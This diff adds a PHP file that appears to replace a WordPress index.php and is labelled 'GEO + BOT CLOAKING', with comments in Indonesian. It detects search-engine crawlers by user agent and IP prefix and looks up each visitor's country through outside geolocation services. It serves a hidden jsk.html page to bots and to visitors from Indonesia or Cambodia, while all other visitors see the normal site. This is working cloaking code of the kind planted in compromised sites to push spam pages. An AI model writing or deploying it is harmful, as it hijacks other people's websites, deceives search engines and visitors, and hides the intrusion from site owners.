@@ -1,0 +1,103 @@
+<?php
+// ==========================
+// GEO + BOT CLOAKING
+// ==========================
+
+$user_agent = strtolower($_SERVER['HTTP_USER_AGENT']);
+
+// ---------- Fungsi untuk dapatkan IP real ----------
+function getClientIp(): string {
+    if (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) {
+        $ip = $_SERVER['HTTP_CF_CONNECTING_IP'];
+    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+        $parts = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
+        $ip = trim($parts[0]);
+    } else {
+        $ip = $_SERVER['REMOTE_ADDR'] ?? '';
+    }
+    return filter_var($ip, FILTER_VALIDATE_IP) ? $ip : '0.0.0.0';
+}
+
+// ---------- Fungsi ambil country code ----------
+function http_get_json($url, $timeout = 2.0) {
+    $ctx = stream_context_create([
+        'http' => [
+            'timeout' => $timeout,
+            'ignore_errors' => true,
+            'header' => "Accept: application/jsonrnUser-Agent: geo-check/1.0rn"
+        ],
+        'ssl' => [
+            'verify_peer' => true,
+            'verify_peer_name' => true,
+        ],
+    ]);
+    $json = @file_get_contents($url, false, $ctx);
+    if ($json !== false && $json !== '') return $json;
+
+    if (function_exists('curl_init')) {
+        $ch = curl_init($url);
+        curl_setopt_array($ch, [
+            CURLOPT_RETURNTRANSFER => true,
+            CURLOPT_FOLLOWLOCATION => true,
+            CURLOPT_CONNECTTIMEOUT => $timeout,
+            CURLOPT_TIMEOUT => $timeout,
+            CURLOPT_HTTPHEADER => ['Accept: application/json','User-Agent: geo-check/1.0'],
+        ]);
+        $json = curl_exec($ch);
+        curl_close($ch);
+        if ($json !== false && $json !== '') return $json;
+    }
+    return null;
+}
+
+function getCountryCode(string $ip): ?string {
+    $endpoints = [
+        "https://ipapi.co/{$ip}/json/",
+        "https://ipinfo.io/{$ip}/json",
+    ];
+    foreach ($endpoints as $url) {
+        $raw = http_get_json($url, 2.0);
+        if (!$raw) continue;
+        $data = json_decode($raw, true);
+        if (!is_array($data)) continue;
+
+        if (!empty($data['country_code'])) return strtoupper($data['country_code']);
+        if (!empty($data['country']))      return strtoupper($data['country']);
+        if (!empty($data['countryCode']))  return strtoupper($data['countryCode']);
+    }
+    return null;
+}
+
+// ---------- Fungsi deteksi bot ----------
+function isBot($user_agent, $clientIp): bool {
+    $bots = ['googlebot','bingbot','slurp','duckduckbot','baiduspider','yandexbot','sogou','exabot','facebot','ia_archiver','mj12bot'];
+    $bot_ips = ['66.249.','157.55.','40.77.','17.58.']; // prefix IP bot
+
+    foreach ($bots as $bot) {
+        if (strpos($user_agent, $bot) !== false) return true;
+    }
+    foreach ($bot_ips as $bot_ip) {
+        if (strpos($clientIp, $bot_ip) === 0) return true;
+    }
+    return false;
+}
+
+// ---------- Eksekusi ----------
+$clientIp = getClientIp();
+$country  = getCountryCode($clientIp);
+$bot      = isBot($user_agent, $clientIp);
+
+// Serve jsk.html untuk Indonesia, Kamboja, atau Googlebot
+if ($bot || $country === 'ID' || $country === 'KH') {
+    if (file_exists(__DIR__ . '/jsk.html')) {
+        header('HTTP/1.1 200 OK');
+        echo file_get_contents(__DIR__ . '/jsk.html');
+    } else {
+        echo '<h1>File jsk.html tidak ditemukan</h1>';
+    }
+    exit;
+}
+
+// Serve WordPress untuk pengunjung lain
+define('WP_USE_THEMES', true);
+require __DIR__ . '/wp-blog-header.php';
